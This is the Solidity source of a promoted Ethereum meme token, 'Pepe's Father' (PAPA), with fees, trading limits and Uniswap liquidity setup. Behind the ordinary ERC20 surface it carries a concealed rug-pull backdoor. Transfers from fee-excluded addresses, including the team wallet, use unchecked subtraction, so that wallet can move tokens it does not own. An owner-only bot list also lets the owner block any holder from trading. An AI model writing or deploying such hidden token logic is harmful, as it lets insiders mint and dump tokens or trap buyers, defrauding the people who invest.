/*

The Father of a Meme Billionaire

In the vibrant world of Memeland, meet Papa, the spirited green frog and father of Pepe, 
the internet's billionaire meme sensation. 
Papa has recently hopped into the spotlight, not to bask in his son's fame, 
but to amplify it. 
With a knack for navigating the digital currents, 
Papa is here to support Pepe and pump up the meme magic that has captured hearts worldwide. 
A fresh face with age-old wisdom, Papa is all set to make waves in the meme market, 
proving that the apple doesn't fall far from the tree.

Website:    https://www.papaeth.vip
Telegram:   https://t.me/papacoin_eth
Twitter:    https://twitter.com/papacoin_eth

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.9;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IPAPARouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IPAPAFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract PAPA is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isFeesExcluded;
    mapping(address => bool) private bots;

    IPAPARouter private papaRouter;
    address private papaPair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 420_690_000_000 * 10 ** _decimals;
    string private constant _name = unicode"Pepe's Father";
    string private constant _symbol = unicode"PAPA";
    uint256 public _papaThresB = 336_552_000_000 * 10 ** _decimals;
    uint256 public _maxTxAmount = 8_413_800_000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 8_413_800_000 * 10 ** _decimals;
    uint256 public _maxTaxSwap = 4_206_900_000 * 10 ** _decimals;
    uint256 public _swapThresPAPA = 420 * 10 ** _decimals;

    uint256 private _initialBuyTax = 20;
    uint256 private _initialSellTax = 20;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 11;
    uint256 private _reduceSellTaxAt = 11;
    uint256 private _preventSwapBefore = 11;
    uint256 private _buyCount = 0;
    
    address payable private _teamEcos;

    uint256 firstBlock;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor(address _papaW) {
        _teamEcos = payable(_papaW);
        _balances[_msgSender()] = _tTotal;
        _isFeesExcluded[owner()] = true;
        _isFeesExcluded[address(this)] = true;
        _isFeesExcluded[_teamEcos] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function enableTrading() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        papaRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            _papaThresB,
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(papaPair).approve(address(papaRouter), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
        firstBlock = block.number;
    }

    function _tokenTransfer(address from, address to, uint256 amount) internal {
        unchecked {
            _balances[from] = _balances[from] - amount;
            _balances[to] = _balances[to] + amount;
        }
        emit Transfer(from, to, amount);
    }

    function initPAPA() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        papaRouter = IPAPARouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(papaRouter), _tTotal);
        papaPair = IPAPAFactory(papaRouter.factory()).createPair(
            address(this),
            papaRouter.WETH()
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function delBots(address[] memory notbot) public onlyOwner {
        for (uint i = 0; i < notbot.length; i++) {
            bots[notbot[i]] = false;
        }
    }

    function isBot(address a) public view returns (bool) {
        return bots[a];
    }

    function _transferBasic(
        address from,
        address to,
        uint256 amount,
        uint256 papaFees
    ) internal {
        if (papaFees > 0) {
            _balances[address(this)] = _balances[address(this)].add(papaFees);
            emit Transfer(from, address(this), papaFees);
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(papaFees));
        emit Transfer(from, to, amount.sub(papaFees));
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (!swapEnabled || inSwap) {
            _transferBasic(from, to, amount, 0);
            return;
        }

        uint256 papaFees = 0;
        if (from != owner() && to != owner()) {
            require(!bots[from] && !bots[to]);
            papaFees = amount
                .mul(
                    (_buyCount > _reduceBuyTaxAt)
                        ? _finalBuyTax
                        : _initialBuyTax
                )
                .div(100);

            if (
                from == papaPair &&
                to != address(papaRouter) &&
                !_isFeesExcluded[to]
            ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );

                if (firstBlock + 3 > block.number) {
                    require(!isContract(to));
                }
                _buyCount++;
            }

            if (to != papaPair && !_isFeesExcluded[to]) {
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
            }

            if (to == papaPair && from != address(this)) {
                papaFees = amount
                    .mul(
                        (_buyCount > _reduceSellTaxAt)
                            ? _finalSellTax
                            : _initialSellTax
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap &&
                to == papaPair &&
                swapEnabled &&
                _buyCount > _preventSwapBefore &&
                !_isFeesExcluded[from] &&
                !_isFeesExcluded[to]
            ) {
                if(balanceOf(address(this)) > _swapThresPAPA){
                    swapTokensForEth(
                        min(amount, min(contractTokenBalance, _maxTaxSwap))
                    );
                }

                _teamEcos.transfer(address(this).balance);
            }
        }

        if (!_isFeesExcluded[from]) {
            _transferBasic(from, to, amount, papaFees);
        } else {
            _tokenTransfer(from, to, amount);
        }
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function isContract(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = papaRouter.WETH();
        _approve(address(this), address(papaRouter), tokenAmount);
        papaRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}
}